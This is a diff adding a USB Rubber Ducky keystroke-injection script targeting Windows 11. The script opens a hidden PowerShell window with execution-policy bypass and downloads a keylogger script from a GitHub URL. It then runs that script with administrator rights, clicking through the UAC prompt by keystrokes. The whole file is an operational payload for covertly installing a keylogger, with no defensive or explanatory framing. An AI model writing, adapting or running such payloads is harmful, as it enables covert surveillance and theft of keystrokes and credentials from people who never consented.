@@ -1,0 +1,26 @@
+REM Target: Windows 11
+
+REM *REQUIREMENTS*
+REM admin required for disable USB function.
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell
+GUI r
+DELAY 500
+
+REM Phase 1: Download the PowerShell script from GitHub
+STRING powershell -WindowStyle Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/RokoPecotic/Keyloggertest/main/KeyloggerPS.ps1' -OutFile 'C:\Users\PC\Downloads\KeyLoggerPS.ps1'"
+ENTER
+DELAY 2000
+
+GUI r
+
+REM Phase 2: Execute the downloaded PowerShell script with admin privileges and hidden window
+STRING powershell -WindowStyle Hidden -Exec Bypass -C C:\Users\PC\Downloads\KeyLoggerPS.ps1 -Verb RunAs
+CTRL-SHIFT ENTER
+LEFTARROW
+ENTER
+DELAY 10
+ALT y
